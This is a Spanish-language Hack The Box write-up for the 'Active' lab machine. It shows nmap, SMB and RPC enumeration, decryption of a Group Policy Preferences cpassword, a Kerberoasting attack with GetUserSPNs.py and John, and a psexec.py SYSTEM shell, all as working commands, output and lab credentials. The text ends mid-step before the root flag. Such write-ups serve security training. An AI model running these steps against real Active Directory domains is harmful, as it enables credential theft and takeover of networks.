---
title: "Active - Hack The Box"
date: 2023-05-02
draft: false
slug: "htb-writeup-active"
excerpt: "Esta máquina fue algo complicada para mí, porque se trató de un ejercicio de Active Directory. Tuve que investigar mucho sobre Active Directory, gracias a la herramienta smbclient y smbmap, se pudo enumerar el servicio SMB siendo que encontramos un archivo que contiene credenciales de usuario, esto nos permitirá hacer el ataque Kerberoasting para obtener credenciales de Root."
categories: ["HackTheBox", "Easy Machine"]
tags: ["Windows", "SMB", "Active Directory", "SMB Enumeration", "SYSVOL Mining", "Exploiting GPP SYSVOL", "Cracking Hash", "Privesc - Kerberoasting Attack", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "crackmapexec"
  - "smbclient"
  - "smbmap"
  - "rpcclient"
  - "gpp-decrypt"
  - "GetUserSPNs.py"
  - "johntheripper"
  - "psexec.py"
links:
  - "https://www.ngi.es/crackmapexec-post-explotacion-entornos-active-directory/"
  - "https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb"
  - "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology"
  - "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast"
  - "https://www.kali.org/tools/smbmap/"
  - "https://adsecurity.org/?p=2288"
  - "https://underc0de.org/foro/herramientas-hacking/smbmap-enumerador-de-recursos-de-compartidos-samba/"
  - "https://docs.redhat.com/es/documentation/red_hat_enterprise_linux/8/html/deploying_different_types_of_servers/assembly_verifying-the-samba-configuration_assembly_using-samba-as-a-server"
  - "https://www.netwrix.com/cracking_kerberos_tgs_tickets_using_kerberoasting.html"
  - "https://github.com/fortra/impacket/issues/1482"
  - "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn581922(v=ws.11)"
showtoc: true
header:
  teaser: "/assets/images/htb-writeup-active/active_logo.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 10.10.10.100
PING 10.10.10.100 (10.10.10.100) 56(84) bytes of data.
64 bytes from 10.10.10.100: icmp_seq=1 ttl=127 time=133 ms
64 bytes from 10.10.10.100: icmp_seq=2 ttl=127 time=133 ms
64 bytes from 10.10.10.100: icmp_seq=3 ttl=127 time=133 ms
64 bytes from 10.10.10.100: icmp_seq=4 ttl=127 time=133 ms

--- 10.10.10.100 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3003ms
rtt min/avg/max/mdev = 133.302/133.395/133.499/0.072 ms
```
Por el TTL sabemos que la máquina usa Windows, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.100 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-02 15:29 CST
Initiating SYN Stealth Scan at 15:29
Scanning 10.10.10.100 [65535 ports]
Discovered open port 139/tcp on 10.10.10.100
Discovered open port 53/tcp on 10.10.10.100
Discovered open port 135/tcp on 10.10.10.100
Discovered open port 445/tcp on 10.10.10.100
Discovered open port 49153/tcp on 10.10.10.100
Discovered open port 49166/tcp on 10.10.10.100
Discovered open port 49168/tcp on 10.10.10.100
Discovered open port 49158/tcp on 10.10.10.100
Discovered open port 49154/tcp on 10.10.10.100
Discovered open port 49165/tcp on 10.10.10.100
Discovered open port 49157/tcp on 10.10.10.100
Discovered open port 49155/tcp on 10.10.10.100
Discovered open port 49152/tcp on 10.10.10.100
Discovered open port 389/tcp on 10.10.10.100
Discovered open port 3268/tcp on 10.10.10.100
Discovered open port 593/tcp on 10.10.10.100
Discovered open port 88/tcp on 10.10.10.100
Increasing send delay for 10.10.10.100 from 0 to 5 due to max_successful_tryno increase to 4
Discovered open port 464/tcp on 10.10.10.100
Increasing send delay for 10.10.10.100 from 5 to 10 due to max_successful_tryno increase to 5
Discovered open port 9389/tcp on 10.10.10.100
Increasing send delay for 10.10.10.100 from 10 to 20 due to max_successful_tryno increase to 6
Discovered open port 47001/tcp on 10.10.10.100
Discovered open port 3269/tcp on 10.10.10.100
Completed SYN Stealth Scan at 15:30, 59.14s elapsed (65535 total ports)
Nmap scan report for 10.10.10.100
Host is up, received user-set (0.29s latency).
Scanned at 2023-05-02 15:29:11 CST for 60s
Not shown: 59239 closed tcp ports (reset), 6275 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
47001/tcp open  winrm            syn-ack ttl 127
49152/tcp open  unknown          syn-ack ttl 127
49153/tcp open  unknown          syn-ack ttl 127
49154/tcp open  unknown          syn-ack ttl 127
49155/tcp open  unknown          syn-ack ttl 127
49157/tcp open  unknown          syn-ack ttl 127
49158/tcp open  unknown          syn-ack ttl 127
49165/tcp open  unknown          syn-ack ttl 127
49166/tcp open  unknown          syn-ack ttl 127
49168/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 59.25 seconds
           Raw packets sent: 292186 (12.856MB) | Rcvd: 63516 (2.541MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Wow, son demasiados puertos abiertos, aunque algunos ya los conocemos. Veamos qué servicios nos arroja con el escaneo de servicios.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sC -sV -p53,88,135,139,389,445,464,593,3268,3269,9389,47001,49152,49153,49154,49155,49157,49158,49165,49166,49168 10.10.10.100 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-02 15:31 CST
Nmap scan report for 10.10.10.100
Host is up (0.14s latency).

PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)

| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec?
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap?
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  globalcatLDAP?
3269/tcp  open  globalcatLDAPssl?
9389/tcp  open  mc-nmf            .NET Message Framing
47001/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc             Microsoft Windows RPC
49153/tcp open  msrpc             Microsoft Windows RPC
49154/tcp open  msrpc             Microsoft Windows RPC
49155/tcp open  msrpc             Microsoft Windows RPC
49157/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc             Microsoft Windows RPC
49165/tcp open  msrpc             Microsoft Windows RPC
49166/tcp open  msrpc             Microsoft Windows RPC
49168/tcp open  msrpc             Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:

| smb2-security-mode: 
|   210: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-05-02T21:33:33
|_  start_date: 2023-05-02T21:24:07

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 119.08 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Está muy raro para mí, no había visto tantos puertos abiertos antes, no sé por qué presiento que estamos contra una máquina estilo **Active Directory**. Investiguemos algunos de los servicios para saber por donde comenzamos a buscar vulnerabilidades.

## Análisis de Vulnerabilidades {#Analisis}

### Investigación de Servicios {#Investigacion}

Vamos a investigar los servicios que podamos identificar de cada puerto, esto con el fin de recopilar información que nos sea útil para encontrar un vector de ataque.

Empecemos:

| **Servicio Kerberos** |
|:-----------:|
| *El servicio Kerberos es una arquitectura cliente-servidor que proporciona seguridad a las transacciones en las redes. El servicio ofrece una sólida autenticación de usuario y también integridad y privacidad.* |

| **Servicio MSRPC** |
|:-----------:|
| *El protocolo Microsoft Remote Procedure Call (MSRPC), un modelo cliente-servidor que permite a un programa solicitar un servicio de un programa ubicado en otra computadora sin entender los detalles de la red, se derivó inicialmente de software de código abierto y luego fue desarrollado y protegido por Microsoft. Los servicios MSRPC proporcionan interfaces para el acceso y administración de los sistemas de Windows de modo remoto.* |

| **Servicio Netbios-SSN** |
|:-----------:|
| *Es un protocolo de aplicación para compartir recursos en red. Se encarga de establecer la sesión y mantener las conexiones. El servicio de sesión se utiliza para la transmisión de datos y la comunicación orientada a la conexión.* |

| **Protocolo LDAP** |
|:-----------:|
| *El protocolo ligero de acceso a directorios (en inglés: Lightweight Directory Access Protocol o LDAP) hace referencia a un protocolo a nivel de aplicación que permite el acceso a un servicio de directorio ordenado y distribuido para buscar diversa información en un entorno de red.* |

| **Servicio Microsoft-DS** |
|:-----------:|
| *Un servicio de directorio, como Active Directory Domain Services (AD DS), proporciona los métodos para almacenar datos de directorio y poner dichos datos a disposición de los usuarios y administradores de la red.* |

| **Protocolo ncacn_http** |
|:-----------:|
| *El protocolo ncacn_http es una variante del protocolo de comunicación de red utilizado en la arquitectura de Microsoft Distributed Component Object Model (DCOM) sobre HTTP. Facilita la comunicación entre clientes y servidores DCOM a través de HTTP, permitiendo el funcionamiento de servicios DCOM a través de firewalls y proxies que permiten tráfico HTTP/HTTPS.* |

Entonces, ya podemos decir que estamos contra una máquina tipo **Active Directory**, como tal no tenemos una página web que podamos revisar para obtener más información y buscar vulnerabilidades.

Por lo que veo, la forma en que vamos a empezar a buscar vulnerabilidades, será por **SMB**.

### Enumeración Servicio SMB {#SMB}

Primero que nada, veamos que nos reporta la herramienta nmap sobre el **servicio SMB activo**.

Realicemos unos escaneos.

* Veamos que protocolos del **SMB** ocupa:
```bash
nmap -p 445 --script smb-protocols 10.10.10.100
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-02 15:39 CST
Nmap scan report for active.htb (10.10.10.100)
Host is up (0.073s latency).
*
PORT    STATE SERVICE
445/tcp open  microsoft-ds
*
Host script results:

| smb-protocols: 
|   dialects: 
|     202
|_    210
```
Como tal no nos reporto nada.

* Veamos que modos de seguridad tiene activos:
```bash
nmap -p 445 --script smb-security-mode 10.10.10.100
Starting Nmap 7.93 ( https://nmap.org ) at 2024-08-06 13:58 CST
Nmap scan report for active.htb (10.10.10.100)
Host is up (0.079s latency).
*
PORT    STATE SERVICE
445/tcp open  microsoft-ds
*
Nmap done: 1 IP address (1 host up) scanned in 1.65 seconds
```
Nada, con esto ya me doy a la idea de que si esta bien asegurado el puerto.

* Veamos que nos puede reportar la herramienta **crackmapexec**:
```bash
crackmapexec smb 10.10.10.100
SMB   10.10.10.100    445    DC     [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
```

Excelente, nos reporta un dominio que ocupa el **SMB**, vamos a registrarlo en nuestra máquina.
```bash
nano /etc/hosts
10.10.10.100 active.htb
```

Bien, vamos a enumerar el **SMB** con las herramientas **smbclient** y **smbmap**. Te dejo un recurso que puede ser de utilidad:
* <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb" target="_blank">HackTricks: 139,445 - Pentesting SMB</a>

Lo principal, sería saber si podemos listar los recursos compartidos con un usuario nulo (null session), ya que con esto, podremos saber si nos podemos loguear como un usuario anónimo:
```bash
smbclient -L //10.10.10.100// -N
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Replication     Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.100 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
Si podemos, aunque ese error que esta reportando no me gusta. Vamos a utilizar la herramienta **smbmap** para la enumeración, ya que nos muestra más detalles que **smbclient**.

#### Enumeración Servicio SMB con SMBMAP {#SMB2}

Para empezar, vamos a listar los recursos compartidos denuevo:
```bash
smbmap -H 10.10.10.100      
[+] IP: 10.10.10.100:445        Name: active.htb                                        
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 
        Users                                                   NO ACCESS
```
Observa que nos dio más detalles como los permisos. 

Solamente podemos ver el directorio **Replicant**, para no ir entrando uno por uno, vamos a utilizar uno de los parámetros de **smbmap** para que nos muestre varios recursos compartidos a la vez:
```bash
smbmap -H 10.10.10.100 -R
[+] IP: 10.10.10.100:445        Name: active.htb                                        
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Replication                                             READ ONLY
        .\Replication\*
        dr--r--r--                0 Sat Jul 21 05:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 05:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 05:37:44 2018    active.htb
        .\Replication\active.htb\*
        dr--r--r--                0 Sat Jul 21 05:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 05:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 05:37:44 2018    DfsrPrivate
        dr--r--r--                0 Sat Jul 21 05:37:44 2018    Policies
        dr--r--r--                0 Sat Jul 21 05:37:44 2018    scripts
        .\Replication\active.htb\DfsrPrivate\*
        dr--r--r--                0 Sat Jul 21 05:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 05:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 05:37:44 2018    ConflictAndDeleted
        dr--r--r--                0 Sat Jul 21 05:37:44 2018    Deleted
        dr--r--r--                0 Sat Jul 21 05:37:44 2018    Installing
        .\Replication\active.htb\Policies\*
        dr--r--r--                0 Sat Jul 21 05:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 05:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 05:37:44 2018    {31B2F340-016D-11D2-945F-00C04FB984F9}
        dr--r--r--                0 Sat Jul 21 05:37:44 2018    {6AC1786C-016F-11D2-945F-00C04fB984F9}
        .\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\*
        dr--r--r--                0 Sat Jul 21 05:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 05:37:44 2018    ..
        fr--r--r--               23 Sat Jul 21 05:38:11 2018    GPT.INI
        dr--r--r--                0 Sat Jul 21 05:37:44 2018    Group Policy
        dr--r--r--                0 Sat Jul 21 05:37:44 2018    MACHINE
        dr--r--r--                0 Sat Jul 21 05:37:44 2018    USER
...
```
Excelente, si nos aventuramos en el **directorio {31B2F340...}**, encontraremos un archivo interesante.

Dentro del directorio **Policies**, hay dos directorios, si revisamos el primero, veremos que hay varios directorios, pero dos de ellos son de interés, el **USER** y el **MACHINE**. Entraremos directamente en **MACHINE** para seguir enumerando y de ahí, nos iremos a **Preferences** y por último a **Groups**:
```bash
smbmap -H 10.10.10.100 -r Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/groups
[+] IP: 10.10.10.100:445        Name: active.htb                                        
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        Replication                                             READ ONLY
        .\Replicationactive.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\groups\*
        dr--r--r--                0 Sat Jul 21 05:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 05:37:44 2018    ..
        fr--r--r--              533 Sat Jul 21 05:38:11 2018    Groups.xml
```

Hay un archivo **XML**, vamos a descargarlo y a renombrarlo:
```bash
smbmap -H 10.10.10.100 --download Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/groups/Groups.xml
[+] Starting download: Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\groups\Groups.xml (533 bytes)
[+] File output to: **/**/**/content/10.10.10.100-Replication_active.htb_Policies_{31B2F340-016D-11D2-945F-00C04FB984F9}_MACHINE_Preferences_groups_Groups.xml

mv 10.10.10.100-Replication_active.htb_Policies_\{31B2F340-016D-11D2-945F-00C04FB984F9\}_MACHINE_Preferences_groups_Groups.xml Groups.xml
```

Pero ¿de qué se trata este archivo? Investiguemos por su nombre como tal y veamos si aparece algo.

Aquí dejo un link muy útil de lo que encontre:
* <a href="https://adsecurity.org/?p=2288" target="_blank">Finding Passwords in SYSVOL & Exploiting Group Policy Preferences</a>

En resumen de lo que menciona el blog, lo que hicimos fue minar **SYSVOL** para encontrar un archivo que se crea en el **Group Policy Preferences (GPP)**, siendo que este contiene las credenciales de usuarios.

| **Recurso SYSVOL** |
|:-----------:|
| *SYSVOL es el recurso compartido de todo el dominio en Active Directory al que todos los usuarios autenticados tienen acceso de lectura. SYSVOL contiene secuencias de comandos de inicio de sesión, datos de políticas de grupo y otros datos de todo el dominio que deben estar disponibles en cualquier lugar donde haya un controlador de dominio (ya que SYSVOL se sincroniza automáticamente y se comparte entre todos los controladores de dominio).* |
 

Analicemos el contenido de este archivo:
```xml
xmllint --format Groups.xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
  <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}">
    <Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/>
  </User>
</Groups>
```
Podemos ver un hash de una contraseña y un usuario llamado **SVC_TGS**. Intentemos descifrar ese hash.

## Explotación de Vulnerabilidades {#Explotacion}

### Crackeando Hash de Groups.xml {#Hash}

Como bien dice el artículo, el cifrado está en **AES-256**. Para descifrar este tipo de cifrado, contamos con la herramienta **GPP-Decrypt**, esta herramienta se encarga de desencriptar esta clase de hashes que se crean en **GPP**, as>
```bash
gpp-decrypt       
Usage: gpp-decrypt: encrypted_data

gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

Comprobemos si el usuario y contraseña nos sirven para loguearnos en el servicio **SMB** con la herramienta **Crackmapexec**:
```bash
crackmapexec smb 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
SMB    10.10.10.100    445    DC   [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB    10.10.10.100    445    DC   [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18
```
No menciona ningún error, quiero pensar que el usuario y contraseña son validos.

Vamos a probarlo con la herramienta **smbmap**, nos debería mostrar más información:
```bash
smbmap -H 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' 
[+] IP: 10.10.10.100:445        Name: active.htb                                        
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share 
        Users                                                   READ ONLY
```
Muy bien, podemos enumerar más recursos compartidos.

### Enumeración Servicio SMB como Usuario SVC_TGS {#SMB3}

Bien, con tan solo navegar un poco dentro de los recursos compartidos, entraremos en **Users** y aqui podemos encontrar la flag del usuario:
```bash
smbmap -H 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -r Users/SVC_TGS/Desktop
[+] IP: 10.10.10.100:445        Name: active.htb                                        
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        Users                                                   READ ONLY
        .\UsersSVC_TGS\Desktop\*

        dr--r--r--                0 Sat Jul 21 10:14:42 2018    .
        dr--r--r--                0 Sat Jul 21 10:14:42 2018    ..
        fw--w--w--               34 Wed May  3 15:50:40 2023    user.txt
```

La descargamos y le cambiamos el nombre al archivo:
```bash
smbmap -H 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --download Users/SVC_TGS/Desktop/user.txt
[+] Starting download: Users\SVC_TGS\Desktop\user.txt (34 bytes)
[+] File output to: **/**/**/content/10.10.10.100-Users_SVC_TGS_Desktop_user.txt

mv 10.10.10.100-Users_SVC_TGS_Desktop_user.txt user.txt
```
Ya tenemos la flag del usuario, pero podemos hacer más cosillas como tratar de entrar en el **servicio MSRPC** con el usuario y contraseña, esto lo realizamos con la herramienta **rpcclient**.

Intentémoslo:
```batch
rpcclient -U 'SVC_TGS%GPPstillStandingStrong2k18' 10.10.10.100                                                                
rpcclient $>
```

Aquí igual podemos enumerar algunas cosillas, por ejemplo:

* Enumerar los usuarios:
```batch
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[SVC_TGS] rid:[0x44f]
```

* Enumerar los grupos del dominio:
```batch
enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[DnsUpdateProxy] rid:[0x44e]
```

* Enumerar descripciones de usuarios:
```batch
rpcclient $> querydispinfo
index: 0xdea RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain
index: 0xdeb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xe19 RID: 0x1f6 acb: 0x00020011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0xeb2 RID: 0x44f acb: 0x00000210 Account: SVC_TGS        Name: SVC_TGS   Desc: (null)
```

* Enumerar los dominios activos:
```batch
rpcclient $> enumdomains
name:[ACTIVE] idx:[0x0]
name:[Builtin] idx:[0x0]
```

Con esto ya demostrado, es momento de buscar una forma de obtener acceso como Root.

## Post Explotación {#Post}

### Aplicando Ataque Kerberoasting {#Ataque}

Podriamos decir que no tenemos otros vector de ataque, pero recuerda que esta activo el **servicio kerberos**, por lo que podemos buscar un exploit que nos ayude a ganar acceso a la máquina con ls recursos que ya contamos.

Durante la busqueda, encontre el ataque Kerberoasting, pero ¿en qué consiste este ataque?

| **Ataque Kerberoasting** |
|:-----------:|
| *Kerberoasting es un ataque que abusa del protocolo Kerberos para recopilar hash de contraseñas para cuentas de usuario de Active Directory con valores servicePrincipalName (SPN), es decir, cuentas de servicio. Un usuario puede solicitar un ticket del servicio de otorgamiento de boletos (TGS) para cualquier SPN, y partes del TGS se pueden cifrar con RC4 utilizando el hash de contraseña de la cuenta de servicio que tiene asignado el SPN solicitado como clave. Por lo tanto, un adversario que pueda robar boletos TGS (ya sea de la memoria o capturándolos rastreando el tráfico de la red) puede extraer el hash de la contraseña de la cuenta de servicio e intentar un ataque de fuerza bruta fuera de línea para obtener la contraseña de texto sin formato.* |

En resumen, podemos robar un **boleto TGS** de un **SPN** cualquiera, por ejemplo del usuario **administrador** del directorio activo, esto para que podamos recopilar el hash de su contraseña y la podamos descifrar. Y como esto lo puede pedir un usuario, al cual ya tenemos acceso, podemos intentar aplicar este ataque.

Para utilizar este ataque, necesitamos la herramienta **GetUserSPNs.py** que viene con la librería **Impacket**, si no lo tienes, aquí te dejo un link en donde puedas descargarlo, pero recomiendo que instales la librería **Impacket**:
* <a href="https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py" target="_blank">Repositorio de fortra: GetUserSPNs.py</a>

Vamos a usar este ataque, hagámoslo por pasos:

* Primero veamos si podemos obtener el **Ticket TGS**:
```bash
GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 14:06:40.351723  2023-05-03 15:50:43.047354
```

* Ahora veamos si nos lo devuelve:
```bash
GetUserSPNs.py -request active.htb/SVC_TGS:GPPstillStandingStrong2k18
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 14:06:40.351723  2023-05-03 15:50:43.047354             
[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$d04f0a50ccbee2fa9e0c0e172ac69416$73a2993383de0c276b30332cece7b08caf74b0d75f9a71f8ace118d65a41b81c47a8d61600573f6beeea7a6385603713b4f0a9
...
```
Tenemos un hash, vamos a copiarlo y a tratar de descifrarlo.

* Copiamos el hash y lo guardamos en un archivo:
```bash
nano hash
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$d04f0a50ccbee2fa9e0c0e172ac694...
```

* Esta vez, usemos **John** para poder crackear el hash:
```bash
john -w=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?)     
1g 0:00:00:18 DONE (2023-05-03 16:51) 0.05428g/s 572056p/s 572056c/s 572056C/s Tickle7..Tibor
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Excelente, ya tenemos la contraseña para el administrador. 

Probemos con **crackmapexec** para ver si la contraseña es correcta:
```bash
crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'Ticketmaster1968'
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)
```

Vamos a loguearnos con **psexec.py**:
```bash
python3 psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100 cmd.exe
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file AoqAcowi.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service fNeh on 10.10.10.100.....
[*] Starting service fNeh.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
C:\Windows\system32> whoami
nt authority\system
```

Por último, busca la flag:
```batch
C:\> cd Users/Administrator/Desktop
